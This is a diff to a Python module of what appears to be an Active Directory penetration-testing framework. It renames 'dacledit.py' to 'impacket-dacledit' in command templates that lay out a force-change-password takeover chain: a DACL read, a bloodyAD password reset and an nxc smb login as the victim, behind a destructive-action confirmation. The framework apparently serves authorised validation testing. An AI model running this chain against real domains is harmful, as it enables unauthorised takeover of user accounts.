@@ -4,7 +4,7 @@ The destructive reference case: a trustee already holding the
 User-Force-Change-Password extended right (or GenericAll) resets a victim's
 password and re-authenticates as them:
 
-    dacledit.py -action read   (confirm the PRECONDITION right)
+    impacket-dacledit -action read   (confirm the PRECONDITION right)
     ctx.destructive_confirmer.confirm("force_change_password", ...)  (warn-press-yes)
     bloodyAD ... set password '<victim>' '<newpw>'
     nxc smb <dc> -u <victim> -p <newpw>   (= the terminal proof)
@@ -22,7 +22,7 @@ never logged, never placed in the receipt (mirrors `rbcd.py`'s own-generated
 computer password and `roast.py`'s cracked plaintext).
 
 ``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
-bloodyAD/dacledit.py human-readable wording (see ``acl_common.py``).
+bloodyAD/impacket-dacledit human-readable wording (see ``acl_common.py``).
 """
 from __future__ import annotations
 
@@ -103,7 +103,7 @@ class ForceChangePasswordExecutor(ValidationExecutor):
         v = values(params)
         dc = ctx.config.dc_ip
         return [
-            f"dacledit.py -action read -target '{v['victim']}' -dc-ip {dc} <auth>  "
+            f"impacket-dacledit -action read -target '{v['victim']}' -dc-ip {dc} <auth>  "
             "(confirm precondition User-Force-Change-Password/GenericAll)",
             "*** DESTRUCTIVE: warn-press-yes confirmation required ***",
             f"bloodyAD ... --host {dc} set password '{v['victim']}' ***",
